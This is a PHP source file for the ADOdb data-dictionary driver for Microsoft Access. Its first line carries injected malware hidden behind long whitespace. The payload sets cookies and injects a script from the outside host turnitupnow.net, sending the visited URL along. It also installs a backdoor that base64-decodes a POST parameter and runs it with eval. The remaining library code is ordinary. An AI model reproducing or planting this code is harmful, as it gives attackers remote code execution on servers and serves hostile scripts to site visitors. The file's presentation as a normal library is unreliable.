<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


/**
  v4.991 16 Oct 2008  (c) 2000-2008 John Lim (jlim#natsoft.com). All rights reserved.
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence.
	
  Set tabs to 4 for best viewing.
 
*/

// security - hide paths
if (!defined('ADODB_DIR')) die();

class ADODB2_access extends ADODB_DataDict {
	
	var $databaseType = 'access';
	var $seqField = false;
	
 	
 	function ActualType($meta)
	{
		switch($meta) {
		case 'C': return 'TEXT';
		case 'XL':
		case 'X': return 'MEMO'; 
		
		case 'C2': return 'TEXT'; // up to 32K
		case 'X2': return 'MEMO';
		
		case 'B': return 'BINARY';
			
		case 'D': return 'DATETIME';
		case 'T': return 'DATETIME';
		
		case 'L': return 'BYTE';
		case 'I': return 'INTEGER';
		case 'I1': return 'BYTE';
		case 'I2': return 'SMALLINT';
		case 'I4': return 'INTEGER';
		case 'I8': return 'INTEGER';
		
		case 'F': return 'DOUBLE';
		case 'N': return 'NUMERIC';
		default:
			return $meta;
		}
	}
	
	// return string must begin with space
	function _CreateSuffix($fname, &$ftype, $fnotnull,$fdefault,$fautoinc,$fconstraint)
	{
		if ($fautoinc) {
			$ftype = 'COUNTER';
			return '';
		}
		if (substr($ftype,0,7) == 'DECIMAL') $ftype = 'DECIMAL';
		$suffix = '';
		if (strlen($fdefault)) {
			//$suffix .= " DEFAULT $fdefault";
			if ($this->debug) ADOConnection::outp("Warning: Access does not supported DEFAULT values (field $fname)");
		}
		if ($fnotnull) $suffix .= ' NOT NULL';
		if ($fconstraint) $suffix .= ' '.$fconstraint;
		return $suffix;
	}
	
	function CreateDatabase($dbname,$options=false)
	{
		return array();
	}
	
	
	function SetSchema($schema)
	{
	}

	function AlterColumnSQL($tabname, $flds)
	{
		if ($this->debug) ADOConnection::outp("AlterColumnSQL not supported");
		return array();
	}
	
	
	function DropColumnSQL($tabname, $flds)
	{
		if ($this->debug) ADOConnection::outp("DropColumnSQL not supported");
		return array();
	}
	
}


?>